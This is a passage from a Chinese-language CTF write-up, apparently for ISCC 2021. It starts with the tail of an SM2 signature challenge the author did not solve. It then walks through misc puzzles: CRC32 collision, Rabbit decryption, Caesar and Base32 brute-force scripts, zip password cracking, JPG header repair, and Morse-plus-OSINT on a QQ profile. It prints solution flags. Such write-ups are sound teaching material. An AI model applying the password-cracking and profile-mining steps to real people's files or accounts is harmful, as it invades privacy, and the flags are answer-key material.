class="hljs-string">&#x27;0&#x27;</span> * <span class="hljs-number">128</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;%s%s&#x27;</span> % (P1, <span class="hljs-string">&#x27;1&#x27;</span>)<br>        len_2 = <span class="hljs-number">2</span> * self.para_len<br>        l1 = <span class="hljs-built_in">len</span>(P1)<br>        l2 = <span class="hljs-built_in">len</span>(P2)<br>        <span class="hljs-keyword">if</span> (l1 &lt; len_2) <span class="hljs-keyword">or</span> (l2 &lt; len_2):<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>        <span class="hljs-keyword">else</span>:<br>            X1 = <span class="hljs-built_in">int</span>(P1[<span class="hljs-number">0</span>:self.para_len], <span class="hljs-number">16</span>)<br>            Y1 = <span class="hljs-built_in">int</span>(P1[self.para_len:len_2], <span class="hljs-number">16</span>)<br>            <span class="hljs-keyword">if</span> l1 == len_2:<br>                Z1 = <span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                Z1 = <span class="hljs-built_in">int</span>(P1[len_2:], <span class="hljs-number">16</span>)<br>            x2 = <span class="hljs-built_in">int</span>(P2[<span class="hljs-number">0</span>:self.para_len], <span class="hljs-number">16</span>)<br>            y2 = <span class="hljs-built_in">int</span>(P2[self.para_len:len_2], <span class="hljs-number">16</span>)<br><br>            T1 = (Z1 * Z1) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T2 = (y2 * Z1) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T3 = (x2 * T1) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T1 = (T1 * T2) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T2 = (T3 - X1) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T3 = (T3 + X1) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T4 = (T2 * T2) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T1 = (T1 - Y1) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            Z3 = (Z1 * T2) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T2 = (T2 * T4) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T3 = (T3 * T4) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T5 = (T1 * T1) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T4 = (X1 * T4) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            X3 = (T5 - T3) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T2 = (Y1 * T2) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T3 = (T4 - X3) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T1 = (T1 * T3) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            Y3 = (T1 - T2) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br><br>            form = <span class="hljs-string">&#x27;%%0%dx&#x27;</span> % self.para_len<br>            form = form * <span class="hljs-number">3</span><br>            <span class="hljs-keyword">return</span> form % (X3, Y3, Z3)<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">_convert_jacb_to_nor</span>(<span class="hljs-params">self, Point</span>):</span> <br>        len_2 = <span class="hljs-number">2</span> * self.para_len<br>        x = <span class="hljs-built_in">int</span>(Point[<span class="hljs-number">0</span>:self.para_len], <span class="hljs-number">16</span>)<br>        y = <span class="hljs-built_in">int</span>(Point[self.para_len:len_2], <span class="hljs-number">16</span>)<br>        z = <span class="hljs-built_in">int</span>(Point[len_2:], <span class="hljs-number">16</span>)<br>        z_inv = <span class="hljs-built_in">pow</span>(z, <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>) - <span class="hljs-number">2</span>, <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>))<br>        z_invSquar = (z_inv * z_inv) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>        z_invQube = (z_invSquar * z_inv) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>        x_new = (x * z_invSquar) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>        y_new = (y * z_invQube) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>        z_new = (z * z_inv) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>        <span class="hljs-keyword">if</span> z_new == <span class="hljs-number">1</span>:<br>            form = <span class="hljs-string">&#x27;%%0%dx&#x27;</span> % self.para_len<br>            form = form * <span class="hljs-number">2</span><br>            <span class="hljs-keyword">return</span> form % (x_new, y_new)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    sk = func.random_hex(<span class="hljs-built_in">len</span>(sm2p256v1_ecc_table[<span class="hljs-string">&#x27;n&#x27;</span>]))<br>    tsm2 = TSM2(sk)<br>    print(<span class="hljs-string">&#x27;pk:%s&#x27;</span>   %tsm2.pk)<br>    print(<span class="hljs-string">&#x27;pks:%064x&#x27;</span>%tsm2.pks)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>        op = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;op: &#x27;</span>).strip()<br>        <span class="hljs-keyword">if</span> op == <span class="hljs-string">&#x27;sign&#x27;</span>:<br>            sign(tsm2)<br>        <span class="hljs-keyword">elif</span> op == <span class="hljs-string">&#x27;verify&#x27;</span>:<br>            verify(tsm2)<br>        <span class="hljs-keyword">else</span>:<br>            print(<span class="hljs-string">&quot;&quot;&quot;sign: sign message</span><br><span class="hljs-string">verify: verify message&quot;&quot;&quot;</span>)<br></code></pre></td></tr></table></figure><p>暂时没做出来</p><h3 id="混乱的音频"><a href="#混乱的音频" class="headerlink" title="混乱的音频"></a>混乱的音频</h3><blockquote><p>题目描述：<br>小明正在整理包含bed、bird、cat、dog、down、eight的音频文件数据，可小明不小心把分类好的一部分数据集弄混了。文件名非常混乱，无法判别出那些文件属于哪个单词类别。碰巧小红来问小明考试复习资料的密码。小明说：“我记得这个密码都是大写的英文字母，并且密码和我的爱好息息相关，具体的我也记不清了。你要是能帮我把这些音频文件分好类，你应该就会发现密码。”小红了解到小明是个计算机专业的学生，平时经常搜集一些与信息技术有关的新闻资讯。他经常参加ctf比赛，对密码学十分熟悉，对数字非常敏感。为了小红能得到考试复习资料，你能帮助小红将混乱的音频文件分好类并获取密码吗？<br>提示：比例 数据下载链接：<a href="https://pan.baidu.com/s/1r8C1FByHpgNZJsaUkjASOw">https://pan.baidu.com/s/1r8C1FByHpgNZJsaUkjASOw</a> 提取码：p1yh</p></blockquote><h3 id="小明的宠物兔"><a href="#小明的宠物兔" class="headerlink" title="小明的宠物兔"></a>小明的宠物兔</h3><blockquote><p>题目描述：<br>小明的宠物兔总是发出一些神秘的声音，小明很想知道兔兔在干什么，你能帮他翻译一下吗？</p></blockquote><p>一张图片rabbit.txt，提示碰撞，应该是CRC32碰撞，foremost分离出压缩包</p><p>flag.txt内容，加salt，应该是rabbit加密</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">U2FsdGVkX18kNy7RlBvcV9WJsqa+oxvdd0Ir86U2cU2996N6ltZi7VVOaw==<br></code></pre></td></tr></table></figure><p>CRC32碰撞，得到加密压缩包key.zip内容，</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python">┌──(kali㉿kali)-[~/桌面/Python/CRC32]<br>└─$ python3 crc32.py reverse <span class="hljs-number">0x3dacac6b</span> <br><span class="hljs-number">4</span> <span class="hljs-built_in">bytes</span>: &#123;<span class="hljs-number">0x47</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0xce</span>&#125;<br>verification checksum: <span class="hljs-number">0x3dacac6b</span> (OK)<br><span class="hljs-number">5</span> <span class="hljs-built_in">bytes</span>: (<span class="hljs-number">0_0</span>) (OK)<br><span class="hljs-number">5</span> <span class="hljs-built_in">bytes</span>: DCr4m (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: 1QhloU (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: 3mmr6H (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: 49Gqqk (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: 5Uumn6 (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: 7ips7+ (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: 8Gpbyp (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: 9G1Sbi (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: EHZxWz (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: F93jxv (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: I6mk_a (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: J+wTt) (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: K+6eo0 (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: KGEHkt (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: N/jUuJ (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: O/+dnS (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: O3d8oG (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: TX.K94 (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: Uy1jKa (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: XJju5k (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: YJ+D.r (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: Zvoklv (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: a3H1hL (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: dG(pwf (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: e7U0i/ (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: fgb2/o (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: g6AbXj (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: kHvqPq (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: kT9-Qe (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: lQqOzZ (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: vwW0Z8 (OK)                     <br></code></pre></td></tr></table></figure><p>5字节，最终密钥为<code>(0_0)</code>，Rabbit解密得到flag<br><img src="https://img-blog.csdnimg.cn/20210518182708616.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="擂台"><a href="#擂台" class="headerlink" title="擂台"></a>擂台</h2><h3 id="小明的表情包"><a href="#小明的表情包" class="headerlink" title="小明的表情包"></a>小明的表情包</h3><blockquote><p>放假期间小红被亲戚叫去帮店里帮忙，店里忙极了导致小红没有时间写代码。小红苦恼极了，她突然想起来小明有一张非常适合描述她此时心情的表情包。于是，小红让小明把表情包分享给她。小明说如果你记得我的出生的日月年，我就交给你。小明的生日年份隐藏在这串凯撒密码“AVARGRRA<br>AVARGL AVAR”中，你能帮小红得到小明的表情包吗？</p></blockquote><p>编写脚本进行凯撒密码爆破：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">s = <span class="hljs-string">&quot;AVARGRRA AVARGL AVAR&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">kaisa</span>(<span class="hljs-params">k</span>):</span><br>    t = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> s:<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;a&#x27;</span> &lt;= c &lt;= <span class="hljs-string">&#x27;z&#x27;</span>:<br>            t += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>) + ((<span class="hljs-built_in">ord</span>(c) - <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>)) + <span class="hljs-built_in">int</span>(k)) % <span class="hljs-number">26</span>)<br>        <span class="hljs-keyword">elif</span> <span class="hljs-string">&#x27;A&#x27;</span> &lt;= c &lt;= <span class="hljs-string">&#x27;Z&#x27;</span>:<br>            t += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>) + ((<span class="hljs-built_in">ord</span>(c) - <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>)) + <span class="hljs-built_in">int</span>(k)) % <span class="hljs-number">26</span>)<br>        <span class="hljs-keyword">else</span>:<br>            t += c<br>    print(t)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">26</span>):<br>    kaisa(i)<br><br></code></pre></td></tr></table></figure><p>看到有含义的英文：NINETEEN NINETY NINE<br><img src="https://img-blog.csdnimg.cn/20210502214305685.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>猜测是901909，然而并不是压缩包口令，根据题目提示密码是生日年份，直接爆破8位数字密码<br><img src="https://img-blog.csdnimg.cn/20210502214743451.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到口令07071999，解压压缩包，得到的jpg文件无法打开，拖入010 editor中，与正常的jpg文件比较，发现缺少JPG文件头<br><img src="https://img-blog.csdnimg.cn/20210502215507914.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>将前八位改为FF D8 FF E0 00 10 4A 46，保存得到flag<br><img src="https://img-blog.csdnimg.cn/20210502215613249.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="Base小偷"><a href="#Base小偷" class="headerlink" title="Base小偷"></a>Base小偷</h3><blockquote><p>被凯撒小猫偷走的等号1/3<br>Flag格式：flag{XXX}</p></blockquote><p>密文</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">trefy2k2ov2lig2gqd2eqakoxjqcw4lztnfli<br></code></pre></td></tr></table></figure><p>使用上面的凯撒密码爆破脚本，修改一下脚本，写入crack.txt文件中：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">s = <span class="hljs-string">&quot;trefy2k2ov2lig2gqd2eqakoxjqcw4lztnfli&quot;</span><br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;crack.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">kaisa</span>(<span class="hljs-params">k</span>):</span><br>    t = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> s:<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;a&#x27;</span> &lt;= c &lt;= <span class="hljs-string">&#x27;z&#x27;</span>:<br>            t += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>) + ((<span class="hljs-built_in">ord</span>(c) - <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>)) + <span class="hljs-built_in">int</span>(k)) % <span class="hljs-number">26</span>)<br>        <span class="hljs-keyword">elif</span> <span class="hljs-string">&#x27;A&#x27;</span> &lt;= c &lt;= <span class="hljs-string">&#x27;Z&#x27;</span>:<br>            t += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>) + ((<span class="hljs-built_in">ord</span>(c) - <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>)) + <span class="hljs-built_in">int</span>(k)) % <span class="hljs-number">26</span>)<br>        <span class="hljs-keyword">else</span>:<br>            t += c<br>    print(t)<br>    f.write(t+<span class="hljs-string">&quot;\n&quot;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">26</span>):<br>    kaisa(i)<br></code></pre></td></tr></table></figure><p>得到crack.txt</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python">trefy2k2ov2lig2gqd2eqakoxjqcw4lztnfli<br>usfgz2l2pw2mjh2hre2frblpykrdx4mauogmj<br>vtgha2m2qx2nki2isf2gscmqzlsey4nbvphnk<br>wuhib2n2ry2olj2jtg2htdnramtfz4ocwqiol<br>xvijc2o2sz2pmk2kuh2iueosbnuga4pdxrjpm<br>ywjkd2p2ta2qnl2lvi2jvfptcovhb4qeyskqn<br>zxkle2q2ub2rom2mwj2kwgqudpwic4rfztlro<br>aylmf2r2vc2spn2nxk2lxhrveqxjd4sgaumsp<br>bzmng2s2wd2tqo2oyl2myiswfryke4thbvntq<br>canoh2t2xe2urp2pzm2nzjtxgszlf4uicwour<br>dbopi2u2yf2vsq2qan2oakuyhtamg4vjdxpvs<br>ecpqj2v2zg2wtr2rbo2pblvziubnh4wkeyqwt<br>fdqrk2w2ah2xus2scp2qcmwajvcoi4xlfzrxu<br>gersl2x2bi2yvt2tdq2rdnxbkwdpj4ymgasyv<br>hfstm2y2cj2zwu2uer2seoyclxeqk4znhbtzw<br>igtun2z2dk2axv2vfs2tfpzdmyfrl4aoicuax<br>jhuvo2a2el2byw2wgt2ugqaenzgsm4bpjdvby<br>kivwp2b2fm2czx2xhu2vhrbfoahtn4cqkewcz<br>ljwxq2c2gn2day2yiv2wiscgpbiuo4drlfxda<br>mkxyr2d2ho2ebz2zjw2xjtdhqcjvp4esmgyeb<br>nlyzs2e2ip2fca2akx2ykueirdkwq4ftnhzfc<br>omzat2f2jq2gdb2bly2zlvfjselxr4guoiagd<br>pnabu2g2kr2hec2cmz2amwgktfmys4hvpjbhe<br>qobcv2h2ls2ifd2dna2bnxhlugnzt4iwqkcif<br>rpcdw2i2mt2jge2eob2coyimvhoau4jxrldjg<br>sqdex2j2nu2khf2fpc2dpzjnwipbv4kysmekh<br></code></pre></td></tr></table></figure><p>猜测是Base32编码，得到密文每行37字符 ，而Base32按5比特切分的二进制数据必须是40比特的倍数，需要在每行末尾追三个===，并且小写转换为大写</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding: UTF-8</span><br><span class="hljs-keyword">import</span> base64<br><br>ff = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;output.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;crack.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    lines = f.readlines()<br>    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> lines:<br>        line_n =line.replace(<span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br>        line_n=line_n+<span class="hljs-string">r&#x27;===&#x27;</span>+<span class="hljs-string">&#x27;\n&#x27;</span>     <span class="hljs-comment">#行末尾加上&quot;===&quot;,同时加上&quot;\n&quot;换行符</span><br>        line_new=line_n.upper()        <span class="hljs-comment">#小写转换为大写</span><br>        ff.write(line_new)           <span class="hljs-comment">#写入一个新文件中</span><br>ff.close()<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;output.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br><br>    <span class="hljs-built_in">list</span> = f.read().splitlines()   <span class="hljs-comment">#存入列表中</span><br>    i = <span class="hljs-number">0</span><br>    ls2 = [<span class="hljs-built_in">str</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>]  <span class="hljs-comment">#转换为字符串类型</span><br>    <span class="hljs-keyword">while</span> i &lt; <span class="hljs-built_in">len</span>(<span class="hljs-built_in">list</span>):<br>        print(base64.b32decode(ls2[i]))<br>        i += <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>运行脚本，发现一段base64编码<br><img src="https://img-blog.csdnimg.cn/20210502213613369.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>base64解码得到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">flag&#123;tqq.tqq@jjb&#125;<br></code></pre></td></tr></table></figure><h3 id="真作假时假亦真"><a href="#真作假时假亦真" class="headerlink" title="真作假时假亦真"></a>真作假时假亦真</h3><blockquote><p>浅韵姐姐第一次参加ISCC，但没有很多CTF工具，为此她很苦恼。<br>你能切身体会一下吗？<br>附件下载链接：<a href="https://pan.baidu.com/s/1jroyNjtnCwPXxt6A8_0pAw">https://pan.baidu.com/s/1jroyNjtnCwPXxt6A8_0pAw</a><br>提取码：a0oh</p></blockquote><p>下载附件，得到download.wav，拖入Audacity查看频谱图</p><p><img src="https://img-blog.csdnimg.cn/20210508204254102.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>弄下来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">.. ... -.-. -.-. ---... .... . -.-. .... --- -. . -.-- --..-- .-.-.. -.-- --- ..- .-.. --- --- -.- .. -. --. ..-. --- .-. - .... . ..-. ..- -.-. -.- .. -. --. ..-. .-.. .- --. -. --- .-- ..--..<br></code></pre></td></tr></table></figure><p>摩斯密码解密</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ISCCHECHONEYYOULOOKINGFORTHEFUCKINGFLAGNOW?<br></code></pre></td></tr></table></figure><p>不是flag，foremost分离文件得到一张png图片，exiftool查看图片信息，得到QQ号<br><img src="https://img-blog.csdnimg.cn/20210508204759240.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查看QQ空间，在留言板发现假flag<img src="https://img-blog.csdnimg.cn/20210508204953265.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>加好友问题<code>ISCC&#123;e@$Y_s0cia1_engineering&#125;</code>也是假flag</p><p>空间里唯一的一张图片<br><img src="https://img-blog.csdnimg.cn/202105082051187.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>我当时做的时候掉坑里去了，直接下载图片，010 editor什么也看不到，思路就断了。<br><img 